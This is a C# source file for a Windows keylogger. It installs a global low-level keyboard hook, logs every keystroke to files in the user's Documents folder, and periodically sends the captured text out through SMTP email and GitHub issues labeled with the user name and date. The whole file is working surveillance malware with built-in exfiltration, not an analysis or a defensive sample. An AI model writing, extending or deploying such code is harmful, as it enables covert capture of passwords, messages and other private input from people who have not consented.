using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using KeyLog.WindowsApi;

namespace KeyLog.Common {
  class KeyHook {

    static string Name;
    static int CodeSize;
    static int TextSize;
    static int TextWritten;
    static int CodeWritten;
    static IntPtr Hook = IntPtr.Zero;
    static LowLevelKeyboardProc Proc;
    static StreamWriter HeadFile;
    static StreamWriter CodeFile;
    static StreamWriter TextFile;
    public static StringBuilder Code;
    public static StringBuilder Text;
    public static Smtp    Email;
    public static Octokit GitHub;

    readonly static string PAPP = "extra-keylog";


    public static void Init(KeyHookConfig c, Smtp email, Octokit github) {
      Init(c.Name, c.CodeSize, c.TextSize, email, github);
    }

    public static void Init(string title, int codeSize, int textSize, Smtp email, Octokit github) {
      Name = title;
      CodeSize = codeSize <= 0 ? 1024 : codeSize;
      TextSize = textSize <= 0 ? 256  : textSize;
      Email = email;
      GitHub = github;
      InitHook();
      InitFiles();
      InitStrings();
      WriteHead();
      Console.WriteLine("aasasas");
    }

    public static string FullName() {
      string user = Environment.UserName;
      string date = DateTime.Today.ToString("dd_MM_yyyy");
      return Name+"_"+user+"_"+date;
    }


    // Keyboard hook procedure.
    static IntPtr KbdHookProc(int code, WM wParam, [In] KBDLLHOOKSTRUCT lParam) {
      if (code >= 0) {
        Keys k = (Keys) lParam.vkCode;
        bool active = wParam == WM.KEYDOWN || wParam == WM.SYSKEYDOWN;
        Console.WriteLine(active ? k + "+ " : k + "- ");
        WriteCode(active ? k+"+ " : k+"- ");
        WriteText(KeyChar.Name(lParam.vkCode, active));
      }
      return User32.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
    }


    static void WriteHead() {
      string user = Environment.UserName;
      WriteHead(string.Format("[{0}] {0}-code {0}-text\n", user));
    }

    static Task<string> WriteHead(string s) {
      HeadFile.Write(s);
      HeadFile.Flush();
      Email.Send(Name, s);
      return GitHub.CreateIssue(Name, s);
    }

    static void WriteCode(string s) {
      CodeFile.Write(s);
      Code.Append(s);
      CodeWritten += s.Length;
      if (CodeWritten >= CodeSize) FlushCode();
    }

    static void WriteText(string s) {
      TextFile.Write(s);
      Text.Append(s);
      TextWritten += s.Length;
      if (TextWritten >= TextSize) FlushText();
    }

    public static void Flush() {
      Task.WaitAll(new Task[] { FlushCode(), FlushText() });
    }

    static Task<string> FlushCode() {
      string code = Code.ToString();
      Code.Clear();
      CodeWritten = 0;
      CodeFile.Flush();
      Email.Send(FullName(), code);
      return GitHub.CreateIssue(FullName(), code);
    }

    static Task<string> FlushText() {
      string text = Text.ToString();
      Text.Clear();
      TextWritten = 0;
      TextFile.Flush();
      Email.Send(FullName(), text);
      return GitHub.CreateIssue(FullName(), text);
    }


    static void InitHook() {
      Proc = new LowLevelKeyboardProc(KbdHookProc);
      ProcessModule module = Process.GetCurrentProcess().MainModule;
      IntPtr hMod = Kernel32.GetModuleHandle(module.ModuleName);
      Hook = User32.SetWindowsHookEx(HookType.WH_KEYBOARD_LL, Proc, hMod, 0);
      KeyChar.Init();
    }

    static void InitFiles() {
      string user = Environment.UserName;
      string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
      string dir   = Path.Combine(docs, PAPP);
      string phead = Path.Combine(docs, PAPP, "head.log");
      string pcode = Path.Combine(docs, PAPP, user + "-code.log");
      string ptext = Path.Combine(docs, PAPP, user + "-text.log");
      Directory.CreateDirectory(dir);
      HeadFile = new StreamWriter(phead, true);
      CodeFile = new StreamWriter(pcode, true);
      TextFile = new StreamWriter(ptext, true);
    }

    static void InitStrings() {
      Code = new StringBuilder();
      Text = new StringBuilder();
    }
  }


  struct KeyHookConfig {
    public string Name;
    public int    CodeSize;
    public int    TextSize;

    public KeyHookConfig(Dictionary<string, string> options, string prefix="") {
      var o = options;
      var p = prefix;
      o.TryGetValue(p+"name", out Name);
      o.TryGetValue(p+"codesize", out string codeSize);
      o.TryGetValue(p+"textsize", out string textSize);
      int.TryParse(codeSize, out CodeSize);
      int.TryParse(textSize, out TextSize);
    }
  }
}
